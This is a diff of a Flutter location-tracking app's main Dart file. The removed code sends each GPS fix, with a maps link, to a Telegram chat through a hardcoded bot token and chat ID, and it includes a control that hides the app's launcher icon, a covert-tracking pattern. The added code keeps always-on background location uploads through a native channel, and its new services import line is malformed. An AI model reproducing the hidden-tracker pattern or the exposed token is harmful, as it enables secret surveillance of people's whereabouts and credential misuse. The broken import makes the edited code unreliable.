@@ -4,8 +4,9 @@ import 'package:flutter/material.dart';
 import 'package:get/get_navigation/get_navigation.dart';
 import 'package:location/location.dart' as l;
 import 'package:permission_handler/permission_handler.dart';
-import 'package:http/http.dart' as http;
-import 'package:flutter/services.dart';
+import 'package.flutter/services.dart';
+
+// You no longer need the 'http' package here, as the native code handles it.
 
 void main() => runApp(const MyApp());
 
@@ -31,17 +32,18 @@ class HomeScreen extends StatefulWidget {
 
 class _HomeScreenState extends State<HomeScreen> {
   bool gpsEnabled = false;
-  bool permissionGranted = false;
+  // Let's rename this to be more descriptive
+  bool backgroundPermissionGranted = false;
   l.Location location = l.Location();
-  late StreamSubscription subscription;
-  bool trackingEnabled = false;
-
+  
+  // This stream is now only for showing live location in the UI, not for sending data.
+  StreamSubscription? _locationSubscription;
   List<l.LocationData> locations = [];
+  bool isForegroundTrackingActive = false;
 
-  final String botToken = '7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4';
-  final String chatId = '5080555370';
-
-  static const platform = MethodChannel('com.example.location_tracking_app/launcher');
+  // Method Channels
+  static const launcherPlatform = MethodChannel('com.example.location_tracking_app/launcher');
+  static const backgroundPlatform = MethodChannel('com.example.location_tracking_app/background');
 
   @override
   void initState() {
@@ -51,23 +53,102 @@ class _HomeScreenState extends State<HomeScreen> {
 
   @override
   void dispose() {
-    stopTracking();
+    _locationSubscription?.cancel();
     super.dispose();
   }
 
+  // --- Permission and Status Check Logic ---
+  Future<void> checkStatus() async {
+    final isGps = await location.serviceEnabled();
+    final isPermitted = await Permission.locationAlways.isGranted;
+    setState(() {
+      gpsEnabled = isGps;
+      backgroundPermissionGranted = isPermitted;
+    });
+  }
+  
+  Future<void> requestEnableGps() async {
+    if (!gpsEnabled) {
+      bool isGpsActive = await location.requestService();
+      if (isGpsActive) {
+        setState(() => gpsEnabled = true);
+      }
+    }
+  }
+
+  Future<void> requestLocationPermission() async {
+    // We now request "locationAlways" for the background worker
+    final status = await Permission.locationAlways.request();
+    setState(() {
+      backgroundPermissionGranted = status == PermissionStatus.granted;
+    });
+    if (status.isPermanentlyDenied) {
+        // The user opted to never ask again
+        openAppSettings();
+    }
+  }
+
+  // --- Background Task Logic ---
+  Future<void> startBackgroundTracking() async {
+    if (!gpsEnabled || !backgroundPermissionGranted) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('Please enable GPS and grant "Allow all the time" location permission.')),
+      );
+      return;
+    }
+    try {
+        await backgroundPlatform.invokeMethod('startPeriodicDataUpload');
+        log("Started periodic background data upload.");
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(content: Text('Background tracking started! Data will be sent every ~15 minutes.')),
+        );
+    } on PlatformException catch(e) {
+        log("Failed to start background tracking: ${e.message}");
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(content: Text('Error: ${e.message}')),
+        );
+    }
+  }
+
+  Future<void> stopBackgroundTracking() async {
+    try {
+        await backgroundPlatform.invokeMethod('stopPeriodicDataUpload');
+        log("Stopped periodic background data upload.");
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(content: Text('Background tracking stopped!')),
+        );
+    } on PlatformException catch(e) {
+        log("Failed to stop background tracking: ${e.message}");
+    }
+  }
+
+  // --- Foreground (UI) Location Logic ---
+  void startForegroundTracking() {
+      if(isForegroundTrackingActive) return;
+      // This subscription is only to display the location in the app's list view.
+      _locationSubscription = location.onLocationChanged.listen((l.LocationData currentLocation) {
+          setState(() {
+              locations.insert(0, currentLocation);
+          });
+      });
+      setState(() => isForegroundTrackingActive = true);
+  }
+
+  void stopForegroundTracking() {
+      _locationSubscription?.cancel();
+      setState(() {
+          isForegroundTrackingActive = false;
+          locations.clear();
+      });
+  }
+
+  // --- UI ---
   @override
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: const Text('Location App'),
+        title: const Text('Device Tracker'),
         centerTitle: true,
-        actions: [
-          IconButton(
-            icon: const Icon(Icons.visibility_off),
-            tooltip: "Hide from App Drawer",
-            onPressed: hideAppIcon,
-          ),
-        ],
       ),
       body: Padding(
         padding: const EdgeInsets.symmetric(horizontal: 12),
@@ -76,53 +157,72 @@ class _HomeScreenState extends State<HomeScreen> {
             buildListTile(
               "GPS",
               gpsEnabled
-                  ? const Text("Okey")
+                  ? const Text("Enabled", style: TextStyle(color: Colors.green))
                   : ElevatedButton(
                       onPressed: requestEnableGps,
-                      child: const Text("Enable Gps")),
+                      child: const Text("Enable GPS")),
             ),
             buildListTile(
-              "Permission",
-              permissionGranted
-                  ? const Text("Okey")
+              "Background Permission",
+              backgroundPermissionGranted
+                  ? const Text("Granted", style: TextStyle(color: Colors.green))
                   : ElevatedButton(
                       onPressed: requestLocationPermission,
                       child: const Text("Request Permission")),
             ),
-            buildListTile(
-              "Location",
-              trackingEnabled
-                  ? ElevatedButton(
-                      onPressed: stopTracking,
-                      child: const Text("Stop"))
-                  : ElevatedButton(
-                      onPressed: gpsEnabled && permissionGranted
-                          ? startTracking
-                          : null,
-                      child: const Text("Start")),
+            const Divider(),
+            const Padding(
+              padding: EdgeInsets.all(8.0),
+              child: Text(
+                  "This sends data every ~15 mins, even if the app is closed. This uses the device's battery.",
+                   textAlign: TextAlign.center,
+                   style: TextStyle(fontSize: 12, color: Colors.grey),
+              ),
+            ),
+            Row(
+              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
+              children: [
+                ElevatedButton.icon(
+                  icon: const Icon(Icons.play_arrow),
+                  label: const Text("Start Background Tracking"),
+                  onPressed: startBackgroundTracking,
+                  style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
+                ),
+                ElevatedButton.icon(
+                  icon: const Icon(Icons.stop),
+                  label: const Text("Stop"),
+                  onPressed: stopBackgroundTracking,
+                  style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
+                ),
+              ],
+            ),
+            const Divider(),
+            ListTile(
+              title: const Text("Show Live Location in App"),
+              trailing: Switch(
+                value: isForegroundTrackingActive,
+                onChanged: (val) {
+                  if (val) {
+                    startForegroundTracking();
+                  } else {
+                    stopForegroundTracking();
+                  }
+                },
+              ),
             ),
             Expanded(
               child: ListView.builder(
                 itemCount: locations.length,
                 itemBuilder: (context, index) {
                   return ListTile(
+                    dense: true,
                     title: Text(
-                      "${locations[index].latitude} ${locations[index].longitude}"),
+                      "${locations[index].latitude?.toStringAsFixed(5)}, ${locations[index].longitude?.toStringAsFixed(5)}"),
+                    subtitle: Text(DateTime.fromMillisecondsSinceEpoch(locations[index].time!.toInt()).toIso8601String()),
                   );
                 },
               ),
             ),
-            const SizedBox(height: 16),
-            ElevatedButton.icon(
-              icon: const Icon(Icons.visibility_off),
-              label: const Text("Hide App Icon (Android Only)"),
-              onPressed: hideAppIcon,
-              style: ElevatedButton.styleFrom(
-                backgroundColor: Colors.redAccent,
-                foregroundColor: Colors.white,
-              ),
-            ),
-            const SizedBox(height: 8),
           ],
         ),
       ),
@@ -132,90 +232,8 @@ class _HomeScreenState extends State<HomeScreen> {
   ListTile buildListTile(String title, Widget? trailing) {
     return ListTile(
       dense: true,
-      title: Text(title),
+      title: Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
       trailing: trailing,
     );
-  }
-
-  void requestEnableGps() async {
-    if (!gpsEnabled) {
-      bool isGpsActive = await location.requestService();
-      setState(() => gpsEnabled = isGpsActive);
-    }
-  }
-
-  void requestLocationPermission() async {
-    PermissionStatus status = await Permission.locationWhenInUse.request();
-    setState(() => permissionGranted = status == PermissionStatus.granted);
-  }
-
-  Future<bool> isPermissionGranted() async =>
-      await Permission.locationWhenInUse.isGranted;
-
-  Future<bool> isGpsEnabled() async =>
-      await Permission.location.serviceStatus.isEnabled;
-
-  void checkStatus() async {
-    setState(() {
-      isPermissionGranted().then((val) => permissionGranted = val);
-      isGpsEnabled().then((val) => gpsEnabled = val);
-    });
-  }
-
-  void addLocation(l.LocationData data) {
-    setState(() => locations.insert(0, data));
-  }
-
-  void clearLocation() => setState(() => locations.clear());
-
-  void startTracking() async {
-    if (!(await isGpsEnabled()) || !(await isPermissionGranted())) return;
-
-    subscription = location.onLocationChanged.listen((event) {
-      addLocation(event);
-      sendToTelegram(event.latitude!, event.longitude!);
-    });
-
-    setState(() => trackingEnabled = true);
-  }
-
-  void stopTracking() {
-    subscription.cancel();
-    setState(() => trackingEnabled = false);
-    clearLocation();
-  }
-
-  Future<void> sendToTelegram(double lat, double lng) async {
-    final url = Uri.parse(
-        'https://api.telegram.org/bot$botToken/sendMessage');
-
-    final text = "📍 New location:\nLatitude: $lat\nLongitude: $lng\nhttps://maps.google.com/?q=$lat,$lng";
-
-    try {
-      await http.post(url, body: {
-        'chat_id': chatId,
-        'text': text,
-      });
-      log("Location sent to Telegram");
-    } catch (e) {
-      log("Failed to send location: $e");
-    }
-  }
-
-  Future<void> hideAppIcon() async {
-    try {
-      await platform.invokeMethod('hideLauncherIcon');
-      if (mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          const SnackBar(content: Text('App icon hidden from drawer!')),
-        );
-      }
-    } on PlatformException catch (e) {
-      if (mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(content: Text('Failed to hide app icon: ${e.message}')),
-        );
-      }
-    }
   }
 }
